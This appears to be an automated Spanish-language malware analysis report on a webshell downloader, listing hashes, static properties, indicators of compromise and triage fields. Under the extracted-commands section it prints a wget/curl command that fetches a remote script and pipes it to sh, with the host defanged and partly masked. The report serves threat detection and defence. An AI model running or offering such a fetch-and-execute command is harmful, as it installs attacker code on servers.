# 🧬 Payload Analysis

`7d587aece23cdc49de8f5271849997aa6812a1183377c15bca67fa5dee9467d2`

## 📌 Resumen

Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Familia:** `webshell`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:01:36+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `7d587aece23cdc49de8f5271849997aa6812a1183377c15bca67fa5dee9467d2`
- **SHA1:** `051fa83f326e70953a2502d2f00106b233fc093f`
- **MD5:** `3e1c3ceae60b8635b81217ff2f1ce1f6`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (324), with CRLF line terminators |
| Tamaño | 4.0 KiB |
| Entropía | 5.61 |
| Strings | 101 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (324), with CRLF line terminators; strings=101; iocs=6

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh -s apache.selfre
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.168.XXX | static_analysis |
| ip | 217.60.195.XXX | static_analysis |
| url | hxxps://217.60.195.XXX/sh | strings |
| url | hxxps://217.60.195.XXX/sh) | strings |
| hash | 7d587aece23cdc49de8f5271849997aa6812a1183377c15bca67fa5dee9467d2 | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
| ip | 2.26.49.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
